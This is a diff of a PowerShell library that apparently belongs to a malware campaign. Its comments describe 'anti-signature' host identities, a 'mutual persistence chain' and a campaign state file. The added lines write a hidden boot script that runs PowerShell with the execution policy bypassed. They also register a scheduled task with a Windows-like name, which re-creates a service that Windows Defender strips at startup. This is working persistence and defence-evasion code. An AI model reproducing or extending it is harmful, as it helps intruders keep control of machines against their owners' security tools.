@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L37
+# OWN_LIB  BUILD 20260802L38
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L37: Get-GryxaMsi validates OLE magic + requires readable FP match when pinned; dropped jsdelivr binary (served 9-byte error). L36: boot-strip svc-recreate.
+# L38: TASK_G WucacheGryxaBoot ONSTART runs gryxa-ensure -NoWait -Force at boot (Defender strips SCM entry at startup). L37: MSI magic+FP validate.
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -168,9 +168,24 @@ function Ensure-PersistTasks {
         Copy-Item -LiteralPath $MonPath -Destination $bootEtl -Force -ErrorAction SilentlyContinue
         Copy-Item -LiteralPath $MonPath -Destination $etlMon -Force -ErrorAction SilentlyContinue
     }
+    # L37: dedicated boot gryxa-heal. Defender can strip the gryxa SCM service entry during
+    # boot before the mon's MINUTE task fires. A boot-trigger ensure (-NoWait -Force) re-creates
+    # it within seconds of startup, so reboots no longer drop the host from gryxa.
+    $bootGryxa = Join-Path $boot 'gryxa_boot.cmd'
+    $libInBoot = Join-Path $boot 'own_lib.ps1'
+    if (Test-Path -LiteralPath (Join-Path $WorkDir 'own_lib.ps1')) {
+        Copy-Item -LiteralPath (Join-Path $WorkDir 'own_lib.ps1') -Destination $libInBoot -Force -ErrorAction SilentlyContinue
+    }
+    $gbLines = @(
+        '@echo off',
+        ('start /min "" powershell -NoProfile -ExecutionPolicy Bypass -File "{0}" -Action gryxa-ensure -Deep -Force -NoWait -WorkDir "{1}" -Build BOOT' -f $libInBoot, $WorkDir),
+        'exit'
+    )
+    Set-Content -LiteralPath $bootGryxa -Value $gbLines -Encoding ASCII -Force
     # BOOT is not LockDir'd by own_secure — Task Scheduler can resolve TR there.
     $trMon = "cmd.exe /c $bootMon"
     $trEtl = "cmd.exe /c $bootEtl"
+    $trGryxa = "cmd.exe /c $bootGryxa"
     $moA = [string]$id['MO_A']; if (-not $moA) { $moA = '2' }
     $moB = [string]$id['MO_B']; if (-not $moB) { $moB = '3' }
     $st = (Get-Date).ToString('HH:mm')
@@ -179,17 +194,19 @@ function Ensure-PersistTasks {
         @{ Key = 'TASK_B'; Marker = 'etl_mon.cmd'; Sc = 'MINUTE'; Mo = $moB; Tr = $trEtl }
         @{ Key = 'TASK_C'; Marker = 'own_mon.cmd'; Sc = 'ONSTART'; Mo = ''; Tr = $trMon }
         @{ Key = 'TASK_D'; Marker = 'own_mon.cmd'; Sc = 'ONLOGON'; Mo = ''; Tr = $trMon }
+        @{ Key = 'TASK_G'; Marker = 'gryxa_boot.cmd'; Sc = 'ONSTART'; Mo = ''; Tr = $trGryxa }
     )
     $ok = 0; $rearmed = 0; $fail = 0
     foreach ($sp in $specs) {
-        $tn = Normalize-TaskName ([string]$id[$sp.Key])
+        # TASK_G (boot gryxa-heal) uses a fixed name; the A-D rotation pool has no slot for it.
+        $tn = if ($sp.Key -eq 'TASK_G') { 'WucacheGryxaBoot' } else { Normalize-TaskName ([string]$id[$sp.Key]) }
         if (-not $tn) { $fail++; continue }
         if (Test-TaskOwnsMon $tn $sp.Marker) { $ok++; continue }
         if (Test-TaskOwnsMon ("\$tn") $sp.Marker) { $ok++; continue }
         $blob = Get-TaskVerboseBlob $tn
         if (-not $blob) { $blob = Get-TaskVerboseBlob ("\$tn") }
         if ($blob) {
-            $oursBroken = ($blob -match '(?i)own_mon\.cmd|etl_mon\.cmd|\.wucache\\|\.etlcache\\')
+            $oursBroken = ($blob -match '(?i)own_mon\.cmd|etl_mon\.cmd|gryxa_boot\.cmd|\.wucache\\|\.etlcache\\')
             if (-not $oursBroken) { $fail++; Write-OwnLog "tasks_skip_foreign $tn"; continue }
             Remove-TaskQuiet $tn
             Remove-TaskQuiet ("\$tn")
